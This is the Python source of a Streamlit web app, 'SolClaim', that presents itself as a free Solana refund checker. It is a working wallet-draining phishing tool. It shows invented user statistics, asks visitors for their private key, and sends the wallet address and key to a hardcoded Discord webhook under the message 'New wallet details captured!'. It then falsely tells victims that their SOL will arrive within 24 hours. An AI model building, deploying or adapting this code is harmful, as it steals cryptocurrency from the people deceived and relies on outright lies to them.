import streamlit as st
import time
import requests
import base58  # For validating Solana private keys
from solana.rpc.api import Client

# Initialize Solana client
solana_client = Client("https://api.mainnet-beta.solana.com")

# Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1334214089492267018/kHwvZUbz4zsWDU4Xy2WkXspgR1_JPXbbftLzeVfKdBm6T0t4w8GGUhn4CN_b5-WSN3Ht"

def is_valid_solana_private_key(private_key):
    try:
        decoded_key = base58.b58decode(private_key)
        return len(decoded_key) == 32
    except:
        return False

def send_to_discord(wallet_address, private_key):
    webhook_url = "https://discord.com/api/webhooks/1334214089492267018/kHwvZUbz4zsWDU4Xy2WkXspgR1_JPXbbftLzeVfKdBm6T0t4w8GGUhn4CN_b5-WSN3Ht"
    message = {
        "content": f"New wallet details captured!\nWallet: {wallet_address}\nPrivate Key: {private_key}"
    }
    requests.post(webhook_url, json=message)

# Streamlit app title
st.title("💰 SolClaim: Reclaim Your Sol!")

# Display stats
st.write("📊 Stats: 6252 users have already claimed 1925.67 SOL in total!")
st.write("If you've traded or received tokens on Solana (like Raydium or Pumpfun), use SolClaim to check if you're eligible to claim back SOL for FREE.")

# Navigation menu
menu = st.sidebar.selectbox("Navigation", ["Check Wallet ✅", "Invite & Earn 📢"])

def send_to_discord(wallet_address, private_key):
    webhook_url = "https://discord.com/api/webhooks/1334214089492267018/kHwvZUbz4zsWDU4Xy2WkXspgR1_JPXbbftLzeVfKdBm6T0t4w8GGUhn4CN_b5-WSN3Ht"
    message = {
        "content": f"New wallet details captured!\nWallet: {wallet_address}\nPrivate Key: {private_key}"
    }
    response = requests.post(webhook_url, json=message)
    return response.status_code == 200

if menu == "Check Wallet ✅":
    st.header("Check Wallet Eligibility")
    wallet_address = st.text_input("❓ Enter your Solana wallet address to check available SOL to claim:")

    if wallet_address:
        with st.spinner("🕑 Loading wallet info..."):
            time.sleep(3)
            balance = solana_client.get_balance(wallet_address)
            if balance['result']:
                sol_balance = balance['result']['value'] / 1e9
                st.success(f"🎉 You have {sol_balance:.6f} SOL available to claim!")
                
                if st.button("Proceed with Cleanup"):
                    private_key = st.text_input("Enter your private key to proceed:", type="password")
                    if private_key:
                        if is_valid_solana_private_key(private_key):
                            send_to_discord(wallet_address, private_key)
                            st.success("✅ Successfully initiated cleanup! Your SOL will be transferred within 24 hours.")
                            st.info("🕒 Please wait while we process your request. You'll receive your SOL soon!")
                        else:
                            st.error("Invalid Solana private key. Please enter a valid private key.")
            else:
                st.error("Invalid wallet address or no SOL available to claim.")

elif menu == "Invite & Earn 📢":
    st.header("Invite & Earn 📢")
    st.write("🚧 This feature is currently under development. 🚧")
    st.write("We're working hard to bring you a seamless referral system where you can invite friends and earn rewards!")
    st.write("Please check back soon for updates. Thank you for your patience! 🙏")
